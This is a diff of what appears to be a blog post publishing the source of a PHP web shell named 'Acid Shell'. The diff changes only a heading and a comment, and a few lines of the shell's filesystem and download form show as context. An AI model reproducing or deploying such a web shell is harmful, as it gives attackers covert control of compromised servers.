@@ -16,7 +16,7 @@ The Acid Shell seems to simply make use of various other shells all put together
 
 It&#8217;s also private! private! private! &#8230;
 
-## The Acid Shell Source Code
+### The Acid Shell Source Code
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php
     /*
@@ -2749,7 +2749,7 @@ It&#8217;s also private! private! private! &#8230;
     &lt;/td&gt;&lt;/tr&gt;
     &lt;tr&gt;&lt;td align=right&gt;PHP Filesystem:&lt;/td&gt;
     &lt;td&gt;
-    &lt;?php ##[ Acid ]## ?&gt;
+    &lt;?php ###[ Acid ]### ?&gt;
     &lt;script language="javascript"&gt;
     function set_arg(txt1,txt2) {
       document.forms.fphpfsys.phpfsysfunc.value.selected = "Download";
